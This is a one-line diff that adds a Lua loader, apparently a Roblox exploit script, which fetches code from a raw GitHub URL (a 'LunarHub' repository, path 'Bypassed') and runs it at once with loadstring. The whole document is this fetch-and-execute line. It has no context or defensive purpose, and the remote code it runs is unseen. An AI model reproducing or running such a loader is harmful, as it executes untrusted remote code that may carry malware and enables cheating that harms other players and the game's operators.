@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Next1x/LunarHub/main/Bypassed", true))()
